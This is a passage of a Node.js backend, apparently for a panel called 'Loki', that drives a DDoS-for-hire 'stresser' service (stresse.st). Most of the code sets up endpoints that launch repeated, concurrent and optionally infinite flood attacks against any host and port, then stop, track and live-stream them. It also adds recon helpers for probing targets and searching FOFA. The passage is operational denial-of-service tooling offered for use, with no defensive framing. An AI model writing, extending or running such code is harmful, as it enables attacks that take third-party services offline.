            const res = await client.post('/attack', attackPayload, { headers: attackHeaders });
            const attackId = res.data?.id || res.data?.attack_id;
            if (attackId) {
              loop.roundAttackIds.push(attackId);
              roundSuccesses++;
              // Loop attack'lerini de normal saldirilar gibi kaydet ki restart sonrasi gorunsun
              registerAttack(attackId, loop.sessionId, loop.params, loopId);
              return res;
            }
            // Basarili HTTP ama attackId yoksa retry etme, direkt hata say
            loop.errors += 1;
            console.warn(`[loop ${loopId}] round ${round} concurrent ${c + 1} attackId donmedi`);
            return res;
          } catch (err) {
            if (attempt === MAX_REQUEST_RETRIES) {
              loop.errors += 1;
              console.error(`[loop ${loopId}] round ${round} concurrent ${c + 1} hata (${MAX_REQUEST_RETRIES} retry):`, err.message);
              return null;
            }
            // Exponential backoff: 500ms, 1000ms, 1500ms
            await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
          }
        }
      })()
    );
  }
  await Promise.all(roundAttacks);

  // Her loop'un kendi ardisik hata sayacini takip et (roundlar arasi kalici)
  if (!loop.consecutiveErrors) loop.consecutiveErrors = 0;

  if (roundSuccesses === 0) {
    loop.consecutiveErrors++;
    console.warn(`[loop ${loopId}] round ${round} tamamen basarisiz (${loop.consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS})`);
    if (loop.consecutiveErrors >= MAX_LOOP_CONSECUTIVE_ERRORS) {
      console.error(`[loop ${loopId}] Cok fazla hata, loop otomatik durduruluyor`);
      loop.running = false;
    }
  } else {
    loop.consecutiveErrors = 0;
  }

  // Saldiri stresse.st uzerinde time saniye surer; loop'un siradaki turu
  // icin saldiri bitene kadar bekle. Kullanici durdurursa erken cik.
  const waitUntil = Date.now() + (loop.params.time * 1000);
  while (loop.running && Date.now() < waitUntil) {
    await new Promise(r => setTimeout(r, 1000));
  }

  // Sonsuz loop degilse bu tek turdu, loop'u durdur
  if (!loop.params.infinite) {
    loop.running = false;
  }

  saveState();
}

function cleanupLoop(loopId) {
  const finishedLoop = activeLoops[loopId];
  if (finishedLoop?.historyId && attackHistory[finishedLoop.historyId]) {
    if (attackHistory[finishedLoop.historyId].status === 'active') {
      updateAttackHistoryStatus(finishedLoop.historyId, 'completed');
    }
  }
  delete activeLoops[loopId];
  saveState();
  console.log(`[loop ${loopId}] temizlendi`);
}

/**
 * POST /api/stresse/loop
 * Body: { loopId, host, port, time, method, subnet, geo, concurrents, interval, infinite }
 *
 * Non-blocking: loop'u baslatir ve hemen loopId doner. Loop arka planda calisir.
 */
app.post('/api/stresse/loop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId, port, time, method, subnet = '32', geo = 'worldwide', concurrents = 1, interval = 5, infinite = false, layer = 'L4' } = req.body;
    const rawHost = req.body.host;
    const host = layer === 'L7' ? normalizeUrl(rawHost) : normalizeHost(rawHost);
    if (!loopId || !host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'loopId, host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum süre ${minTime} saniye (${method})` });
    }

    const planCheck = checkPlanLimits(sessionId, time, concurrents);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    if (activeLoops[loopId] && activeLoops[loopId].running) {
      return res.status(409).json({ status: 'error', message: 'Loop already running', loopId });
    }

    // Loop saldirisini history'ye sadece bir kez kaydet
    const historyId = addAttackHistory(sessionId, { host, port, method, time }, {
      loop: true,
      concurrents: parseInt(concurrents),
      historyId: `hist_loop_${loopId}`
    });

    activeLoops[loopId] = {
      running: true,
      sessionId,
      historyId,
      params: { host, port: parseInt(port), time: parseInt(time), method, subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer },
      displayTarget: layer === 'L7' ? host : `${host}:${port}`,
      startedAt: new Date().toISOString(),
      lastRoundAt: null,
      roundCount: 0,
      errors: 0,
      roundAttackIds: []
    };

    // Loop'u arka planda calistir, response hemen donsun
    runLoop(loopId);

    res.json({ status: 'success', loopId, message: 'Loop baslatildi' });
    saveState();
  } catch (error) {
    handleEndpointError(res, error, 'Loop error');
  }
});

/**
 * POST /api/stresse/stop
 * Body: { id }
 * Not: stresse.st /stop endpoint'i CSRF token istemez.
 */
app.post('/api/stresse/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { id } = req.body;
    if (!id) return res.status(400).json({ status: 'error', message: 'id required' });

    // Eger durdurulan saldiri bir loop'a aitse, sadece o saldiriyi loop'un
    // round listesinden cikar; loop kendi intervaliyle devam etsin.
    Object.keys(activeLoops).forEach((key) => {
      const loop = activeLoops[key];
      if (loop?.roundAttackIds?.includes(id)) {
        loop.roundAttackIds = loop.roundAttackIds.filter((attackId) => attackId !== id);
        console.log(`[stop] Loop roundundan attack ${id} cikarildi: ${key}`);
      }
    });
    saveState();

    const client = getClient(sessionId);
    // CSRF token gonderilirse stresse.st "Attack not found" donuyor
    const response = await client.post('/stop', { id }, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 60000
    });

    // Durdurulan saldiriyi kayittan sil
    const attackRecord = activeAttacks[id];
    const loopIdOfAttack = attackRecord?.loopId;
    unregisterAttack(id);

    // History durumunu guncelle
    const history = findActiveHistoryByAttackId(id);
    if (history && !history.loop) {
      // Sadece normal saldirilarin history'si durduruldu olarak isaretlenir.
      updateAttackHistoryStatus(history.historyId, 'stopped');
    }

    // Eger durdurulan saldiri bir loop'a aitse ve o loop artik aktif degilse,
    // loop history'sini durduruldu olarak isaretle (kullanici loop modundan cikarilmis
    // loop'un saldirilarini tek tek durduruyor demektir).
    if (loopIdOfAttack && !activeLoops[loopIdOfAttack]) {
      const loopHistoryId = `hist_loop_${loopIdOfAttack}`;
      if (attackHistory[loopHistoryId] && attackHistory[loopHistoryId].status === 'active') {
        updateAttackHistoryStatus(loopHistoryId, 'stopped');
      }
    }

    res.json(response.data);
  } catch (error) {
    handleEndpointError(res, error, 'Stop error');
  }
});

/**
 * POST /api/stresse/stop/bulk
 * Body: { ids: [id1, id2, ...], batchSize?: number, delayMs?: number, concurrency?: number }
 * Not: stresse.st /stop endpoint'i CSRF token istemez.
 *
 * ID'leri kucuk gruplara ayirir; her grup icindeki istekleri
 * sinirli concurrency ile paralel atar. Bu sayede cok sayida
 * saldiriyi hizli ve rate limit riskini azaltarak durdurur.
 */
app.post('/api/stresse/stop/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { ids, batchSize = 10, delayMs = 500, concurrency = 5 } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ status: 'error', message: 'ids array required' });
    }

    const size = Math.max(1, Math.min(parseInt(batchSize) || 10, 20));
    const delay = Math.max(0, Math.min(parseInt(delayMs) || 500, 5000));
    const concurrent = Math.max(1, Math.min(parseInt(concurrency) || 5, 10));

    const client = getClient(sessionId);
    const results = [];
    const totalBatches = Math.ceil(ids.length / size);

    const stopSingle = async (id) => {
      try {
        // CSRF token gonderilirse stresse.st "Attack not found" donuyor
        const response = await client.post('/stop', { id }, {
          headers: { 'Content-Type': 'application/json' },
          timeout: 60000
        });
        return { id, status: 'success', data: response.data };
      } catch (err) {
        return { id, status: 'error', message: err.message, data: err.response?.data };
      }
    };

    const runWithConcurrency = async (items, fn, limit) => {
      const out = [];
      for (let i = 0; i < items.length; i += limit) {
        const chunk = items.slice(i, i + limit);
        const chunkResults = await Promise.all(chunk.map(fn));
        out.push(...chunkResults);
        if (i + limit < items.length) {
          await new Promise((r) => setTimeout(r, 200));
        }
      }
      return out;
    };

    for (let i = 0; i < ids.length; i += size) {
      const batch = ids.slice(i, i + size);
      const currentBatch = Math.floor(i / size) + 1;

      const batchResults = await runWithConcurrency(batch, stopSingle, concurrent);
      results.push(...batchResults);

      // Durdurulan ID'leri ilgili loop'larin round listelerinden cikar;
      // loop'lar kendi intervaliyle devam etsin.
      batch.forEach((id) => {
        Object.keys(activeLoops).forEach((key) => {
          const loop = activeLoops[key];
          if (loop?.roundAttackIds?.includes(id)) {
            loop.roundAttackIds = loop.roundAttackIds.filter((attackId) => attackId !== id);
            console.log(`[stop/bulk] Loop ${key} roundundan attack ${id} cikarildi`);
          }
        });
      });
      saveState();

      // Son batch degilse kisa bir bekleme (rate limit korumasi)
      if (currentBatch < totalBatches) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }

    // Durdurulan tum ID'leri kayittan sil ve history'yi guncelle.
    const stoppedLoopIds = new Set();
    ids.forEach((id) => {
      const attackRecord = activeAttacks[id];
      const loopIdOfAttack = attackRecord?.loopId;
      unregisterAttack(id);
      const history = findActiveHistoryByAttackId(id);
      if (history && !history.loop) {
        updateAttackHistoryStatus(history.historyId, 'stopped');
      }
      if (loopIdOfAttack && !activeLoops[loopIdOfAttack]) {
        stoppedLoopIds.add(loopIdOfAttack);
      }
    });

    // Loop modu sonlandirilmis ve kullanici o loop'un saldirilarini tek tek
    // veya toplu durdurursa, loop history'sini durduruldu olarak isaretle.
    stoppedLoopIds.forEach((loopId) => {
      const loopHistoryId = `hist_loop_${loopId}`;
      if (attackHistory[loopHistoryId] && attackHistory[loopHistoryId].status === 'active') {
        updateAttackHistoryStatus(loopHistoryId, 'stopped');
      }
    });

    res.json({ status: 'success', total: ids.length, results });
  } catch (error) {
    handleEndpointError(res, error, 'Bulk stop error');
  }
});

/**
 * POST /api/stresse/loop/stop
 * Body: { loopId }
 */
app.post('/api/stresse/loop/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId } = req.body;
    if (!loopId) {
      // loopId verilmezse tum loop'lari durdur ve kayittan sil
      Object.keys(activeLoops).forEach((key) => {
        activeLoops[key].running = false;
        delete activeLoops[key];
      });
      saveState();
      return res.json({ status: 'success', message: 'Tum looplar durduruldu' });
    }

    if (!activeLoops[loopId]) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    const loop = activeLoops[loopId];

    // Loop'u "loop modundan" cikar: yeni round baslatma, ama mevcut round'daki
    // saldirilari durdurma. Loop history'si hala "active" kalir; saldirilar
    // normal surelerince bittiginde cleanupExpiredAttacks onu "completed" yapar.
    activeLoops[loopId].running = false;
    delete activeLoops[loopId];
    saveState();
    res.json({ status: 'success', message: 'Loop modu sonlandirildi; mevcut saldirilar devam ediyor', loopId });
  } catch (error) {
    handleEndpointError(res, error, 'Loop stop error');
  }
});

/**
 * GET /api/stresse/loops
 * Tum aktif loop listesini doner (global, herkes gorebilir).
 */
app.get('/api/stresse/loops', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const loops = Object.entries(activeLoops)
      .filter(([_, value]) => value.running)
      .map(([key, value]) => ({
        loopId: key,
        ...value
      }));

    res.json({ status: 'success', count: loops.length, loops });
  } catch (error) {
    handleEndpointError(res, error, 'Loop list error');
  }
});

/**
 * GET /api/stresse/history/:username
 * Kullanicinin saldiri gecmisini doner.
 */
app.get('/api/stresse/history/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;

    // Sadece kendi gecmisini gorebilir
    const sessionUser = sessions[sessionId]?.username;
    if (sessionUser && sessionUser !== username) {
      return res.status(403).json({ status: 'error', message: 'Forbidden' });
    }

    const records = Object.values(attackHistory)
      .filter((h) => h.username === username)
      .sort((a, b) => new Date(b.startedAt).getTime() - new Date(a.startedAt).getTime());

    res.json({ status: 'success', count: records.length, records });
  } catch (error) {
    handleEndpointError(res, error, 'History fetch error');
  }
});

/**
 * GET /api/stresse/loop/:loopId
 * Tek loop detayini doner.
 */
app.get('/api/stresse/loop/:loopId', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId } = req.params;
    const loop = activeLoops[loopId];
    if (!loop) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    res.json({ status: 'success', loopId, ...loop });
  } catch (error) {
    handleEndpointError(res, error, 'Loop status error');
  }
});

// =====================
// CHECK / RECON TOOLS
// =====================

/**
 * GET /api/check-host?host=...&type=ping|http|tcp|udp|dns
 */
app.get('/api/check-host', async (req, res) => {
  try {
    const { host, type = 'ping' } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    const validTypes = ['ping', 'http', 'tcp', 'udp', 'dns'];
    if (!validTypes.includes(type)) {
      return res.status(400).json({ status: 'error', message: 'Invalid type. Use: ping, http, tcp, udp, dns' });
    }

    // 1. İlk istek: request_id al
    const initResponse = await axios.get(`https://check-host.net/check-${type}`, {
      params: { host, max_nodes: 20 },
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      },
      timeout: 20000
    });

    const requestId = initResponse.data.request_id;
    if (!requestId) {
      return res.json({ status: 'success', data: initResponse.data });
    }

    // 2. Sonuçları bekle (max 15 saniye, 3 saniyede bir kontrol)
    let results = null;
    const maxAttempts = 5;
    for (let i = 0; i < maxAttempts; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const resultResponse = await axios.get(`https://check-host.net/check-result/${requestId}`, {
        headers: { 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' },
        timeout: 15000
      });

      if (resultResponse.data && Object.keys(resultResponse.data).length > 0) {
        results = resultResponse.data;
        break;
      }
    }

    res.json({
      status: 'success',
      host,
      type,
      request_id: requestId,
      results: results || {},
      raw: initResponse.data
    });
  } catch (error) {
    console.error('Check-host error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/ping-pe?host=...
 */
app.get('/api/ping-pe', async (req, res) => {
  try {
    const { host } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    // ping.pe does not expose a public API; return a reference link
    res.json({
      status: 'success',
      url: `https://ping.pe/${host}`,
      note: 'Open this link in a browser for MTR results'
    });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/fofa?query=...
 */
app.get('/api/fofa', async (req, res) => {
  try {
    const { query, email, key, size = 10 } = req.query;
    if (!query) return res.status(400).json({ status: 'error', message: 'query required' });
    if (!email || !key) {
      return res.status(400).json({ status: 'error', message: 'FOFA email and API key required' });
    }

    const encodedQuery = Buffer.from(query).toString('base64');
    const response = await axios.get('https://fofa.info/api/v1/search/all', {
      params: { email, key, qbase64: encodedQuery, size },
      timeout: 30000
    });

    res.json({ status: 'success', data: response.data });
  } catch (error) {
    console.error('FOFA error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// =====================
// LIVE ATTACK STREAM (SSE)
// =====================

/**
 * GET /api/stresse/live/:username
 * Server-Sent Events stream of ongoing attacks
 */
// Session ID'yi loglarda gostermemek icin maskele
function maskSessionId(id) {
  if (!id || id.length < 8) return '***';
  return `${id.slice(0, 3)}...${id.slice(-3)}`;
}

app.get('/api/stresse/live/:username', async (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'] || req.query.sid || req.query.SID;
  const { username } = req.params;

  if (!sessionId) {
    return res.status(401).json({ status: 'error', message: 'Session required' });
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');

  let client;
  try {
    client = getClient(sessionId);
  } catch (err) {
    res.write(`event: error\ndata: ${JSON.stringify({ message: err.message })}\n\n`);
    return res.end();
  }

  const interval = setInterval(async () => {
    try {
      const [ongoing, user] = await Promise.all([
        client.get(`/ongoing/${username}`),
        client.get(`/user/${username}`)
      ]);

      const payload = {
        timestamp: new Date().toISOString(),
        ongoing: ongoing.data,
        user: user.data
      };

      res.write(`data: ${JSON.stringify(payload)}\n\n`);
    } catch (err) {
      res.write(`event: error\ndata: ${JSON.stringify({ message: err.message })}\n\n`);
    }
  }, 3000);

  req.on('close', () => {
    clearInterval(interval);
  });
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Load persisted sessions/loops before starting server
loadState();

app.listen(PORT, '127.0.0.1', () => {
  console.log(`Loki backend running on http://localhost:${PORT}`);
});
